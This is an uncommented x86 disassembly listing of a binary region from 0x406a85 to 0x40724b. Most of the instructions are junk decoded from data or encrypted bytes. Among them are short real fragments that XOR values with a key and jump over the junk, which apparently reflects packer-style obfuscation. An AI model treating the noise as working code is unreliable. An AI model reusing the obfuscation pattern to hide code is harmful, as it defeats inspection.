  406a85:	cld    
  406a86:	mov    esi,0x85a95187
  406a8b:	xchg   ebx,eax
  406a8c:	cmp    ebx,DWORD PTR [edx-0x54]
  406a8f:	clc    
  406a90:	les    eax,FWORD PTR [esi]
  406a92:	pop    ecx
  406a93:	push   0xd271d706
  406a98:	mov    ch,0xa3
  406a9a:	loopne 0x406abf
  406a9c:	sbb    eax,0xc69e7153
  406aa1:	out    0x20,eax
  406aa3:	xchg   edx,eax
  406aa4:	das    
  406aa5:	inc    edi
  406aa6:	outs   dx,BYTE PTR cs:[esi]
  406aa8:	arpl   WORD PTR [edi+0x56],sp
  406aab:	add    DWORD PTR [edi],eax
  406aad:	mov    DWORD PTR [ebp-0x6ff565e3],esp
  406ab3:	mov    ds:0x523b2cb6,al
  406ab8:	stos   DWORD PTR es:[edi],eax
  406ab9:	pop    ss
  406aba:	mov    ds:0xc7cf2b2c,al
  406abf:	aad    0x7
  406ac1:	jo     0x406a6f
  406ac3:	hlt    
  406ac4:	je     0x406ae9
  406ac6:	cmc    
  406ac7:	test   DWORD PTR [ecx-0xa15da81],0xc5439ad6
  406ad1:	push   eax
  406ad2:	in     eax,0x28
  406ad4:	cmp    edi,DWORD PTR [eax]
  406ad6:	test   eax,0x4b045740
  406adb:	(bad)  
  406adc:	lods   eax,DWORD PTR ds:[esi]
  406add:	dec    edx
  406ade:	(bad)  
  406adf:	sar    BYTE PTR [ebp-0x72],1
  406ae2:	mov    WORD PTR [ebx],ds
  406ae4:	jmp    0x406aff
  406ae6:	cld    
  406ae7:	adc    al,0x9c
  406ae9:	aas    
  406aea:	das    
  406aeb:	inc    edi
  406aec:	inc    esp
  406aed:	test   al,0xe6
  406aef:	dec    esi
  406af0:	shl    BYTE PTR [ebx+0x1e5a6f30],1
  406af6:	test   bh,ch
  406af8:	jns    0x406b3d
  406afa:	rol    BYTE PTR ds:0x9846aab1,1
  406b00:	xor    DWORD PTR [eax-0x4e],ecx
  406b03:	and    eax,0xa21e27ae
  406b08:	out    dx,eax
  406b09:	into   
  406b0a:	cmovno ecx,ebx
  406b0d:	inc    edi
  406b0e:	dec    esi
  406b0f:	stos   BYTE PTR es:[edi],al
  406b10:	jb     0x406ac7
  406b12:	or     dh,BYTE PTR [esi]
  406b14:	clc    
  406b15:	sbb    al,0x4d
  406b17:	or     al,0xe6
  406b19:	mov    DWORD PTR [eax+0x69],edx
  406b1c:	mov    dh,0x27
  406b1e:	repz out 0x5a,al
  406b21:	jns    0x406b6c
  406b23:	(bad)  [eax-0x9b379d4]
  406b29:	repnz mov bh,0xf8
  406b2c:	mov    eax,ds:0x40b4ccbf
  406b31:	pop    ss
  406b32:	ins    BYTE PTR es:[edi],dx
  406b33:	jmp    0x406b5c
  406b35:	mov    ecx,0x5b9b8c60
  406b3a:	lea    esp,[eax+ebx*1-0x53]
  406b3e:	es xor esi,ecx
  406b41:	hlt    
  406b42:	int3   
  406b43:	xchg   edx,eax
  406b44:	jp     0x406b48
  406b46:	fsqrt  
  406b48:	adc    al,0xd0
  406b4a:	pop    ss
  406b4b:	inc    edi
  406b4c:	and    BYTE PTR [ebx],al
  406b4e:	shr    ecx,1
  406b50:	pop    esi
  406b51:	add    al,0x0
  406b53:	add    BYTE PTR [ebx-0x2fcc17ab],cl
  406b59:	add    edx,DWORD PTR [ebp-0x14]
  406b5c:	mov    edi,DWORD PTR [ebp-0x1c]
  406b5f:	mov    dl,BYTE PTR [edx+edi*1+0x32729f]
  406b66:	mov    BYTE PTR [ebp+0xf],dl
  406b69:	mov    edx,DWORD PTR [ebp-0xc]
  406b6c:	xor    edx,eax
  406b6e:	add    edx,DWORD PTR [ebp-0x14]
  406b71:	jmp    0x406cc3
  406b76:	mov    ah,0x9b
  406b78:	scas   al,BYTE PTR es:[edi]
  406b79:	pop    es
  406b7a:	popa   
  406b7b:	cmp    edx,DWORD PTR [ebp+0x59]
  406b7e:	(bad)  
  406b80:	xor    DWORD PTR [eax-0x34213101],ecx
  406b86:	jecxz  0x406b8e
  406b88:	jle    0x406c08
  406b8a:	and    edi,DWORD PTR [edi+0x7e]
  406b8d:	jle    0x406b77
  406b8f:	cmp    DWORD PTR [edx],0xffffff89
  406b92:	fisttp QWORD PTR [esi-0x2a]
  406b95:	lahf   
  406b96:	xchg   ah,bh
  406b98:	sbb    eax,DWORD PTR [ebp+0x308cb52b]
  406b9e:	fstp   st(0)
  406ba0:	mov    BYTE PTR [ebp+0x76],dh
  406ba3:	pop    esi
  406ba4:	jp     0x406bd1
  406ba6:	rcr    DWORD PTR [ebp-0x2b4277b7],1
  406bac:	aam    0x7
  406bae:	imul   esp,esp,0x565450f
  406bb4:	test   al,0x35
  406bb6:	mov    ds:0xf171894c,eax
  406bbb:	mov    edx,esp
  406bbd:	cli    
  406bbe:	cmp    eax,0x26c94175
  406bc3:	adc    DWORD PTR [ebx-0x17e5ea6c],ecx
  406bc9:	jge    0x406c35
  406bcb:	inc    ebp
  406bcc:	es lea esi,fs:[ebp-0x42e41a4c]
  406bd4:	dec    esi
  406bd5:	(bad)  [ebx]
  406bd7:	xor    BYTE PTR [ebx+0x12e07e2],bl
  406bdd:	inc    esp
  406bde:	push   ds
  406bdf:	gs hlt 
  406be1:	and    al,0xe8
  406be3:	nop
  406be4:	sub    DWORD PTR [eax+eax*8+0x3e],ecx
  406be8:	jmp    0x406c04
  406bea:	leave  
  406beb:	add    al,0xde
  406bed:	ins    BYTE PTR es:[edi],dx
  406bee:	sbb    bl,bh
  406bf0:	leave  
  406bf1:	addr16 cdq 
  406bf3:	jbe    0x406ba3
  406bf5:	mov    edi,0xbcd0a3c9
  406bfa:	sub    BYTE PTR [esi],ch
  406bfc:	cmp    al,0xa4
  406bfe:	push   ss
  406bff:	adc    eax,0x412ad30b
  406c04:	test   eax,0xba076974
  406c09:	sub    BYTE PTR [ecx-0x67],0x12
  406c0d:	leave  
  406c0e:	lods   al,BYTE PTR ds:[esi]
  406c0f:	and    al,BYTE PTR [edx+0x492f7660]
  406c15:	jecxz  0x406c08
  406c17:	dec    ebp
  406c18:	pop    esp
  406c19:	xor    eax,0x4cdd050
  406c1e:	pop    ecx
  406c1f:	cld    
  406c20:	int3   
  406c21:	in     eax,dx
  406c22:	cmp    ebx,esi
  406c24:	pop    ss
  406c25:	mov    al,ds:0x19480a50
  406c2a:	jae    0x406c0b
  406c2c:	xor    BYTE PTR es:[edi+0x4806854e],bl
  406c33:	loopne 0x406be6
  406c35:	scas   al,BYTE PTR es:[edi]
  406c36:	in     eax,dx
  406c37:	mov    cl,0xcb
  406c39:	jae    0x406ca7
  406c3b:	add    eax,0x237248e9
  406c40:	mov    al,0x64
  406c42:	push   eax
  406c43:	pop    edx
  406c44:	pop    edx
  406c45:	cmp    BYTE PTR [eax+0x5a],cl
  406c48:	fucomp st(3)
  406c4a:	out    0x63,al
  406c4c:	sbb    ecx,DWORD PTR [eax]
  406c4e:	push   esp
  406c4f:	jmp    0x406bf5
  406c51:	call   0x6c39e7bb
  406c56:	cmp    BYTE PTR [esi+edi*4-0x18],ch
  406c5a:	out    dx,eax
  406c5b:	lds    ebx,FWORD PTR [ebp+0x68]
  406c5e:	nop
  406c5f:	out    0xb5,eax
  406c61:	dec    esi
  406c62:	adc    eax,0xcf844c3a
  406c67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c68:	adc    esp,edx
  406c6a:	and    DWORD PTR [ebx],esp
  406c6c:	int    0xe5
  406c6e:	cli    
  406c6f:	mov    esp,0xa5fe74b
  406c74:	shl    DWORD PTR [edi*1-0x4cdccbf5],1
  406c7b:	cmc    
  406c7c:	loopne 0x406cad
  406c7e:	sbb    edi,DWORD PTR [eax]
  406c80:	mov    ah,0x9b
  406c82:	lods   eax,DWORD PTR ds:[esi]
  406c83:	pop    edi
  406c84:	sbb    BYTE PTR [esi-0x15a6880c],dl
  406c8a:	dec    edx
  406c8b:	push   ecx
  406c8c:	jg     0x406d03
  406c8e:	xchg   esi,eax
  406c8f:	jecxz  0x406c8f
  406c91:	cwde   
  406c92:	outs   dx,DWORD PTR fs:[esi]
  406c94:	jo     0x406cb5
  406c96:	sbb    edx,DWORD PTR [edx+0x14]
  406c99:	mov    ch,0x78
  406c9b:	adc    ebp,ebp
  406c9d:	cwde   
  406c9e:	cwde   
  406c9f:	mov    ebp,esi
  406ca1:	xchg   esi,eax
  406ca2:	mov    esp,0x83941f35
  406ca7:	sub    BYTE PTR [edx-0x418eb54e],0xed
  406cae:	dec    ebx
  406caf:	gs fwait
  406cb1:	or     DWORD PTR [ecx-0x698b3269],ecx
  406cb7:	js     0x406c84
  406cb9:	push   esp
  406cba:	icebp  
  406cbb:	je     0x406cdb
  406cbd:	pop    edx
  406cbe:	fimul  WORD PTR [edx+eax*1]
  406cc1:	ror    eax,0x8b
  406cc4:	jge    0x406caa
  406cc6:	mov    dl,BYTE PTR [edx+edi*1+0x32729f]
  406ccd:	mov    BYTE PTR [ebp+0xb],dl
  406cd0:	mov    dl,BYTE PTR [ebp+0xf]
  406cd3:	mov    edi,DWORD PTR [ebp-0xc]
  406cd6:	xor    edi,eax
  406cd8:	add    edi,DWORD PTR [ebp-0x14]
  406cdb:	mov    ebx,DWORD PTR [ebp-0x1c]
  406cde:	jmp    0x406e30
  406ce3:	stos   DWORD PTR es:[edi],eax
  406ce4:	out    dx,eax
  406ce5:	pop    edx
  406ce6:	sbb    al,0x5a
  406ce8:	test   eax,0x2e197979
  406ced:	leave  
  406cee:	ss jnp 0x406d6c
  406cf1:	test   al,0x8c
  406cf3:	xchg   esp,eax
  406cf4:	pop    es
  406cf5:	jle    0x406d75
  406cf7:	and    edi,DWORD PTR [edi+0x7e]
  406cfa:	jle    0x406ce6
  406cfc:	jmp    0x406cfd
  406cfe:	jae    0x406cf9
  406d00:	into   
  406d01:	adc    cl,BYTE PTR [eax]
  406d03:	popf   
  406d04:	(bad)  
  406d05:	cmp    al,0x4b
  406d07:	lahf   
  406d08:	sar    BYTE PTR [ecx+0x178e47b7],cl
  406d0e:	or     ax,0xf5f6
  406d12:	jbe    0x406cae
  406d14:	loope  0x406cd4
  406d16:	imul   ebp,DWORD PTR [eax],0xffffffa5
  406d19:	mov    eax,0x1b4e1ce3
  406d1e:	xchg   DWORD PTR [esi+0x73],eax
  406d21:	(bad)  
  406d22:	repnz push eax
  406d24:	cmp    edx,eax
  406d26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d27:	mov    BYTE PTR [eax+0x37],ch
  406d2a:	fdivr  st,st(5)
  406d2c:	mov    bl,0x10
  406d2e:	in     al,0x85
  406d30:	ja     0x406dab
  406d32:	cvttps2pi mm7,QWORD PTR [edi+0x7f2aec9b]
  406d39:	imul   esp,eax,0x52
  406d3c:	inc    ebp
  406d3d:	dec    esi
  406d3e:	jecxz  0x406da4
  406d40:	popf   
  406d41:	cmp    BYTE PTR [esi+0x7a],dh
  406d44:	jo     0x406db1
  406d46:	cmp    esi,esi
  406d48:	(bad)  
  406d49:	retf   
  406d4a:	ds push 0x2c
  406d4d:	out    0xdd,eax
  406d4f:	sub    esi,DWORD PTR [ecx]
  406d51:	pop    ss
  406d52:	out    0xe3,al
  406d54:	clc    
  406d55:	adc    eax,0x38e90c1e
  406d5a:	enter  0xfa1,0xee
  406d5e:	enter  0x2a42,0x5a
  406d62:	mov    ecx,0x79468785
  406d67:	rol    BYTE PTR [ebx],0x47
  406d6a:	test   DWORD PTR ds:0xb259ecaf,edx
  406d70:	add    eax,0x3cb19349
  406d75:	addr16 push edi
  406d77:	retf   0x41d6
  406d7a:	stos   DWORD PTR es:[edi],eax
  406d7b:	jge    0x406d77
  406d7d:	inc    eax
  406d7e:	ret    0x7c29
  406d81:	or     edi,DWORD PTR [edi-0x3be6b2d]
  406d87:	push   0xffffffa8
  406d89:	inc    ebp
  406d8a:	dec    edx
  406d8b:	lahf   
  406d8c:	and    DWORD PTR [ebp+0x15],0x13
  406d90:	push   eax
  406d91:	push   ecx
  406d92:	cmp    WORD PTR [ebx-0x34],bp
  406d96:	sbb    dl,ah
  406d98:	xor    DWORD PTR [ecx-0x7d],0x83ab197a
  406d9f:	test   bh,bh
  406da1:	mov    cl,BYTE PTR [edi+0x5e]
  406da4:	push   ebp
  406da5:	adc    al,0xed
  406da7:	nop
  406da8:	jle    0x406d81
  406daa:	jae    0x406dc3
  406dac:	test   DWORD PTR [edx-0x17],0x4436a83f
  406db3:	retf   0xf9d3
  406db6:	imul   edi,DWORD PTR [ebx+0x45],0x36
  406dba:	in     eax,0xda
  406dbc:	adc    BYTE PTR [ebx-0x1d],ah
  406dbf:	dec    esi
  406dc0:	pop    ebx
  406dc1:	lods   eax,DWORD PTR ds:[esi]
  406dc2:	(bad)  
  406dc3:	in     al,dx
  406dc4:	scas   al,BYTE PTR es:[edi]
  406dc5:	jmp    0x781b6ac3
  406dca:	in     al,dx
  406dcb:	ds dec esi
  406dcd:	rcl    esp,1
  406dcf:	mov    eax,ds:0x20083b09
  406dd4:	jmp    0xb6ad3db1
  406dd9:	mov    dl,0x3e
  406ddb:	int3   
  406ddc:	mov    dh,0x9d
  406dde:	or     dh,ah
  406de0:	sar    DWORD PTR [esi+ebx*8-0x17],0x46
  406de5:	and    eax,0x836f18aa
  406dea:	xor    al,0x73
  406dec:	xor    bh,BYTE PTR [ebp-0x118328cf]
  406df2:	out    dx,al
  406df3:	mov    ebx,0x169d4459
  406df8:	aaa    
  406df9:	adc    dl,dh
  406dfb:	fmul   DWORD PTR [ecx+0x20]
  406dfe:	push   edx
  406dff:	jmp    0x2407:0x7837cad3
  406e06:	cli    
  406e07:	xchg   BYTE PTR [ebx+0x1a],cl
  406e0a:	adc    BYTE PTR [edx+edx*2+0x4cb69477],bl
  406e11:	mov    BYTE PTR [esi+0x2dcaacfd],0x63
  406e18:	cmp    edi,DWORD PTR [ebx]
  406e1a:	xor    cl,cl
  406e1c:	sbb    eax,DWORD PTR [esi-0x5a]
  406e1f:	jge    0x406daf
  406e21:	call   0x65ed:0x2250bc96
  406e28:	shr    BYTE PTR [esi+0x49],1
  406e2b:	mov    ebx,0x522e7180
  406e30:	mov    BYTE PTR [edi+ebx*1+0x32729f],dl
  406e37:	jmp    0x406f89
  406e3c:	jns    0x406e62
  406e3e:	mov    dh,0xd8
  406e40:	dec    ebx
  406e41:	js     0x406ebc
  406e43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e44:	mov    BYTE PTR [esi-0x4],bl
  406e47:	lods   al,BYTE PTR ds:[esi]
  406e48:	ret    0xd3e
  406e4b:	sbb    DWORD PTR [ecx+0x4],0x7f237e7e
  406e52:	jle    0x406ed2
  406e54:	scas   al,BYTE PTR es:[edi]
  406e55:	fsubr  QWORD PTR [ebp-0x74]
  406e58:	cdq    
  406e59:	out    0xb4,al
  406e5b:	inc    esi
  406e5c:	loop   0x406e61
  406e5e:	das    
  406e5f:	gs adc eax,0xc33fa4d3
  406e65:	push   es
  406e66:	mov    al,0x79
  406e68:	stos   BYTE PTR es:[edi],al
  406e69:	test   eax,0x9aa5a00d
  406e6e:	push   es
  406e6f:	cwde   
  406e70:	jmp    0xe9200474
  406e75:	les    edi,FWORD PTR [eax+eiz*4-0xe6e709d]
  406e7c:	pushf  
  406e7d:	popa   
  406e7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e7f:	mov    esi,0xd58aea71
  406e84:	dec    eax
  406e85:	xor    cl,BYTE PTR [edi-0x8]
  406e88:	push   0x607018bf
  406e8d:	inc    ebp
  406e8e:	push   esi
  406e8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e90:	mov    al,ds:0xb606506
  406e95:	or     ch,dh
  406e97:	pop    es
  406e98:	mov    esp,0x4d0d71ce
  406e9d:	cmp    DWORD PTR [ebp+0x6f],ebp
  406ea0:	nop
  406ea1:	jo     0x406ee8
  406ea3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ea4:	cmp    bh,dl
  406ea6:	xor    DWORD PTR [edi],esp
  406ea8:	jecxz  0x406ee8
  406eaa:	push   ds
  406eab:	inc    ebp
  406eac:	mov    ecx,0xb82b7440
  406eb1:	test   BYTE PTR [ebp-0x52365b64],dh
  406eb7:	sbb    esp,DWORD PTR [ebx]
  406eb9:	pusha  
  406eba:	loopne 0x406e8b
  406ebc:	test   DWORD PTR [eax-0x4c],0xce9adfff
  406ec3:	mov    cl,0x7e
  406ec5:	sti    
  406ec6:	xor    BYTE PTR [esi+0x6e23d38e],dl
  406ecc:	mov    dl,0x11
  406ece:	rcl    BYTE PTR [ebp+0x4d],cl
  406ed1:	add    dl,BYTE PTR [edi]
  406ed3:	xor    eax,0x675fc949
  406ed8:	pop    edx
  406ed9:	js     0x406eff
  406edb:	out    dx,al
  406edc:	iret   
  406edd:	pop    edx
  406ede:	mov    edi,0xfea9ba2f
  406ee3:	dec    edi
  406ee4:	cmp    al,0xe
  406ee6:	icebp  
  406ee7:	ror    DWORD PTR [ebx+0x7c5f64db],1
  406eed:	loop   0x406ec6
  406eef:	xor    edi,edx
  406ef1:	idiv   eax
  406ef3:	js     0x406ec4
  406ef5:	iret   
  406ef6:	stos   DWORD PTR es:[edi],eax
  406ef7:	sbb    eax,0xafc9d30d
  406efc:	push   ebp
  406efd:	mov    al,0xb3
  406eff:	push   ebp
  406f00:	cld    
  406f01:	push   ebp
  406f02:	pop    ebx
  406f03:	fadd   QWORD PTR [ebp-0x22]
  406f06:	leave  
  406f07:	pop    ecx
  406f08:	(bad)  
  406f09:	fsub   DWORD PTR [ebx]
  406f0b:	and    al,0x12
  406f0d:	pop    ss
  406f0e:	outs   dx,BYTE PTR ds:[esi]
  406f0f:	clc    
  406f10:	cwde   
  406f11:	cmp    eax,ebp
  406f13:	push   esp
  406f14:	enter  0xc875,0xb6
  406f18:	pop    ebp
  406f19:	nop
  406f1a:	hlt    
  406f1b:	scas   eax,DWORD PTR es:[edi]
  406f1c:	pop    esi
  406f1d:	push   0x7e
  406f1f:	in     eax,dx
  406f20:	aad    0xa0
  406f22:	xor    eax,0xd04bd607
  406f27:	cmc    
  406f28:	loope  0x406f31
  406f2a:	mov    al,ds:0xc220d874
  406f2f:	dec    eax
  406f30:	je     0x406ee0
  406f32:	cs adc eax,0x8178176f
  406f38:	cwde   
  406f39:	cdq    
  406f3a:	cwde   
  406f3b:	mov    edx,0xb7056e1f
  406f40:	pop    ebp
  406f41:	pop    es
  406f42:	(bad)  
  406f43:	mov    ah,0xe
  406f45:	mov    edi,0x46a69a01
  406f4a:	xchg   ebx,eax
  406f4b:	pop    ax
  406f4d:	mov    dl,0x77
  406f4f:	mov    dh,0x4f
  406f51:	adc    DWORD PTR [eax],ebx
  406f53:	or     ebx,DWORD PTR ds:0x8f4bff71
  406f59:	mov    bh,0xbe
  406f5b:	outs   dx,BYTE PTR ds:[esi]
  406f5c:	mov    al,0xfb
  406f5e:	scas   al,BYTE PTR es:[edi]
  406f5f:	jbe    0x406fad
  406f61:	dec    ebx
  406f62:	scas   eax,DWORD PTR es:[edi]
  406f63:	xor    al,0xf3
  406f65:	and    esp,DWORD PTR [ebx+ebp*1-0x61]
  406f69:	stos   DWORD PTR es:[edi],eax
  406f6a:	fiadd  DWORD PTR ds:0xece22c0a
  406f71:	ins    DWORD PTR es:[edi],dx
  406f72:	inc    esp
  406f73:	and    DWORD PTR [ecx],0xa251c0e9
  406f79:	pop    ds
  406f7a:	div    DWORD PTR [ebx-0x1f196475]
  406f80:	repz daa 
  406f82:	imul   ebp,DWORD PTR [edx+0x4f238720],0x71
  406f89:	mov    dl,BYTE PTR [ebp+0xb]
  406f8c:	mov    edi,DWORD PTR [ebp-0x18]
  406f8f:	xor    edi,eax
  406f91:	add    edi,DWORD PTR [ebp-0x14]
  406f94:	mov    ebx,DWORD PTR [ebp-0x1c]
  406f97:	mov    BYTE PTR [edi+ebx*1+0x32729f],dl
  406f9e:	mov    edx,DWORD PTR [ebp-0x44]
  406fa1:	mov    edi,DWORD PTR [ebp-0xc]
  406fa4:	xor    edx,eax
  406fa6:	xor    edi,eax
  406fa8:	add    edx,ecx
  406faa:	add    edi,ecx
  406fac:	imul   edx,edi
  406faf:	add    edx,DWORD PTR [ebp-0x14]
  406fb2:	mov    DWORD PTR [ebp-0x14],edx
  406fb5:	mov    edx,DWORD PTR [ebp-0xc]
  406fb8:	mov    edi,DWORD PTR [ebp-0x24]
  406fbb:	xor    edx,eax
  406fbd:	add    edx,ecx
  406fbf:	imul   edx,edi
  406fc2:	mov    edi,DWORD PTR [ebp-0xc]
  406fc5:	xor    edi,eax
  406fc7:	sub    edx,edi
  406fc9:	mov    edi,DWORD PTR [ebp-0xc]
  406fcc:	mov    ebx,DWORD PTR [ebp-0x14]
  406fcf:	xor    edi,eax
  406fd1:	add    edi,ecx
  406fd3:	imul   edi,ebx
  406fd6:	mov    ebx,DWORD PTR [ebp-0x18]
  406fd9:	xor    ebx,eax
  406fdb:	sub    edx,ecx
  406fdd:	lea    edi,[edi+ebx*1+0x32729f]
  406fe4:	cmp    edi,edx
  406fe6:	jbe    0x406b54
  406fec:	mov    edx,DWORD PTR [ebp-0xc]
  406fef:	mov    edi,DWORD PTR [ebp-0x24]
  406ff2:	xor    edx,eax
  406ff4:	add    edx,ecx
  406ff6:	imul   edx,edi
  406ff9:	mov    edi,DWORD PTR [ebp-0x18]
  406ffc:	xor    edi,eax
  406ffe:	jmp    0x407150
  407003:	hlt    
  407004:	jae    0x40702b
  407006:	pop    ds
  407007:	mov    ecx,0xa4a98439
  40700c:	pushf  
  40700d:	sbb    al,0x11
  40700f:	fmul   st,st(4)
  407011:	call   0x7e5a7287
  407016:	jle    0x40703b
  407018:	jg     0x407098
  40701a:	jle    0x407016
  40701c:	mov    ah,0xf5
  40701e:	sbb    al,0x66
  407020:	daa    
  407021:	pop    edx
  407022:	jno    0x40707b
  407024:	pop    es
  407025:	shl    BYTE PTR [ebp+0x7d],cl
  407028:	push   0x48f76364
  40702d:	retf   
  40702e:	lds    edx,FWORD PTR [edx]
  407030:	jl     0x406fbd
  407032:	std    
  407033:	loopne 0x407075
  407035:	ds fcmove st,st(3)
  407038:	inc    esi
  407039:	js     0x407047
  40703b:	bound  eax,QWORD PTR [ebp+0x58]
  40703e:	xor    bh,BYTE PTR [eax+0x172070b7]
  407044:	es hlt 
  407046:	mov    al,ds:0xf339c8ab
  40704b:	push   ebx
  40704c:	js     0x40704d
  40704e:	mov    esi,0x86b3303
  407053:	adc    DWORD PTR [edx-0xe3dabca],ebp
  407059:	or     edi,edi
  40705b:	jae    0x407026
  40705d:	dec    eax
  40705e:	add    eax,0x8b6e8e20
  407063:	push   ss
  407064:	test   BYTE PTR [edx-0x6f5fce88],0xec
  40706b:	push   ecx
  40706c:	or     dh,BYTE PTR [edi-0x604d8e8d]
  407072:	cmp    DWORD PTR [esi+eiz*4+0xa],esp
  407076:	out    dx,al
  407077:	jmp    0x4eff:0xe530e2b0
  40707e:	aam    0x43
  407080:	inc    eax
  407081:	bound  esi,QWORD PTR [eax-0x1a5b0ca6]
  407087:	jl     0x4070cb
  407089:	push   edi
  40708a:	out    0x3c,eax
  40708c:	dec    edx
  40708d:	xor    ah,dh
  40708f:	mov    dh,0x55
  407091:	xchg   edi,eax
  407092:	push   ebp
  407093:	and    edi,DWORD PTR [ecx+0x3b]
  407096:	daa    
  407097:	scas   al,BYTE PTR es:[edi]
  407098:	pop    edi
  407099:	xor    BYTE PTR [esi],ch
  40709b:	add    eax,0x438c70e
  4070a0:	aas    
  4070a1:	popa   
  4070a2:	fisttp QWORD PTR [edi]
  4070a4:	call   0xc6540cae
  4070a9:	jnp    0x407092
  4070ab:	int3   
  4070ac:	out    0x29,al
  4070ae:	mov    ax,ds:0x2d57690
  4070b4:	shr    edi,1
  4070b6:	retf   
  4070b7:	loop   0x40711a
  4070b9:	xor    DWORD PTR [eax+0x42],0x6de5bf6c
  4070c0:	pop    esi
  4070c1:	mov    dh,ch
  4070c3:	pop    ebp
  4070c4:	jle    0x407131
  4070c6:	addr16 inc ebx
  4070c8:	lahf   
  4070c9:	cmc    
  4070ca:	dec    ebx
  4070cb:	ins    BYTE PTR es:[edi],dx
  4070cc:	retf   
  4070cd:	retf   
  4070ce:	pop    edi
  4070cf:	and    DWORD PTR [ecx+0x5f],0xffffff80
  4070d3:	or     bl,al
  4070d5:	ja     0x407142
  4070d7:	(bad)  
  4070d8:	xor    eax,0xde53dcf4
  4070dd:	sbb    edx,DWORD PTR [esi-0x7763efa5]
  4070e3:	popf   
  4070e4:	inc    eax
  4070e5:	adc    ebx,DWORD PTR [eax+0x1823465c]
  4070eb:	push   dx
  4070ed:	xor    dl,al
  4070ef:	imul   eax,esi,0x6e
  4070f2:	push   edx
  4070f3:	outs   dx,DWORD PTR ds:[esi]
  4070f4:	and    dl,BYTE PTR [ecx+0x6e]
  4070f7:	add    bl,BYTE PTR [edx]
  4070f9:	fst    QWORD PTR [edi]
  4070fb:	sahf   
  4070fc:	cdq    
  4070fd:	jb     0x40713d
  4070ff:	int    0xbd
  407101:	dec    ecx
  407102:	xchg   ebp,ecx
  407104:	lea    esi,[ebp+0x79785c7c]
  40710a:	xlat   BYTE PTR ds:[ebx]
  40710b:	std    
  40710c:	sbb    ch,ch
  40710e:	ins    BYTE PTR es:[edi],dx
  40710f:	neg    dl
  407111:	cmp    ch,BYTE PTR [ebx+0x1f3571fb]
  407117:	test   eax,0x458e1b50
  40711c:	fnstsw WORD PTR [edi]
  40711e:	and    bl,BYTE PTR [esi-0x2a]
  407121:	jo     0x407176
  407123:	push   ds
  407124:	call   0xe08d:0x87c6270b
  40712b:	and    ecx,edi
  40712d:	int    0xba
  40712f:	sub    al,BYTE PTR [esi+edx*2-0x69109b21]
  407136:	mov    dl,0xa1
  407138:	(bad)  
  407139:	ficomp WORD PTR [ebx-0x56253706]
  40713f:	mov    esi,0x4289b869
  407144:	dec    BYTE PTR [edx+0x34c2d6aa]
  40714a:	je     0x4070e5
  40714c:	ret    0x706a
  40714f:	inc    esi
  407150:	add    edx,edi
  407152:	mov    edi,DWORD PTR [ebp-0x8]
  407155:	lea    edx,[edx+edi*1+0x32729f]
  40715c:	mov    DWORD PTR [ebp-0x8],edx
  40715f:	mov    edx,DWORD PTR [ebp-0x20]
  407162:	xor    edx,eax
  407164:	mov    edi,0xffcd8d61
  407169:	sub    edi,edx
  40716b:	add    edi,DWORD PTR [ebp-0x10]
  40716e:	jmp    0x4072c0
  407173:	sub    ebp,DWORD PTR [edi+0x59798f79]
  407179:	jmp    0x9398b939
  40717e:	sub    al,0x6c
  407180:	jge    0x407109
  407182:	sbb    dh,BYTE PTR [edi]
  407184:	sbb    edi,DWORD PTR [esi+0x7e]
  407187:	and    edi,DWORD PTR [edi+0x7e]
  40718a:	jle    0x407152
  40718c:	out    dx,eax
  40718d:	mov    cl,BYTE PTR [eax+0x3fad4226]
  407193:	sub    esp,edi
  407195:	std    
  407196:	lock mov ds:0xcc2e0613,al
  40719c:	mov    bl,0x8f
  40719e:	sti    
  40719f:	cmp    dl,bh
  4071a1:	in     eax,0xbf
  4071a3:	pusha  
  4071a4:	mov    al,0xeb
  4071a6:	shl    DWORD PTR [ebp+ebx*2+0x5e151294],0xc0
  4071ae:	je     0x4071eb
  4071b0:	cmp    DWORD PTR [eax-0x72],0x19c0ebe7
  4071b7:	xchg   ebp,eax
  4071b8:	call   0x5bba:0xf9f814dd
  4071bf:	xor    eax,0xdee66ad3
  4071c4:	jne    0x407178
  4071c6:	sbb    al,0xfb
  4071c8:	push   0xffffff95
  4071ca:	sbb    al,0xbe
  4071cc:	adc    eax,0x2ce98e0a
  4071d1:	lock mov ?,WORD PTR [ebp-0x78]
  4071d5:	xchg   esp,eax
  4071d6:	loope  0x40715b
  4071d8:	ret    
  4071d9:	mov    bh,0x73
  4071db:	fnstenv [edi+0x34f8354b]
  4071e1:	outs   dx,DWORD PTR ds:[esi]
  4071e2:	ret    
  4071e3:	idiv   esp
  4071e5:	scas   eax,DWORD PTR es:[edi]
  4071e6:	jo     0x407214
  4071e8:	fld    DWORD PTR [esp+ebx*2+0x1fe11edc]
  4071ef:	cmp    BYTE PTR [edx-0x4d5161f8],bh
  4071f5:	or     esi,ebp
  4071f7:	inc    edi
  4071f8:	inc    ebp
  4071f9:	jae    0x407274
  4071fb:	(bad)  
  4071fc:	in     al,0x9d
  4071fe:	or     DWORD PTR [edi+0x6626bd62],edi
  407204:	ins    DWORD PTR es:[edi],dx
  407205:	aaa    
  407206:	dec    eax
  407207:	push   sp
  407209:	(bad)  
  40720b:	or     eax,DWORD PTR [edi]
  40720d:	out    0xff,al
  40720f:	xchg   ecx,eax
  407210:	push   ss
  407211:	ss xor al,0x2e
  407214:	cmp    ch,al
  407216:	and    DWORD PTR [edx],edi
  407218:	popa   
  407219:	rcr    BYTE PTR [ecx+esi*8-0x74],cl
  40721d:	dec    ebp
  40721e:	ins    BYTE PTR es:[edi],dx
  40721f:	push   0xffffffee
  407221:	push   ebx
  407222:	xchg   edi,eax
  407223:	add    DWORD PTR [ebx-0x1],esp
  407226:	lods   eax,DWORD PTR ds:[esi]
  407227:	std    
  407228:	push   edi
  40722a:	sub    al,0xc4
  40722c:	daa    
  40722d:	pop    esi
  40722e:	imul   cl
  407230:	out    0xf,al
  407232:	mov    BYTE PTR [edi],bh
  407234:	retf   0x50c4
  407237:	sbb    BYTE PTR [ebx],dh
  407239:	je     0x407229
  40723b:	dec    esp
  40723c:	repz sbb ah,bl
  40723f:	push   ebp
  407240:	loopne 0x40729b
  407242:	in     eax,dx
  407243:	and    BYTE PTR [esi+edi*4-0x5045c543],0x87
  40724b:	test   eax,0x7be14162
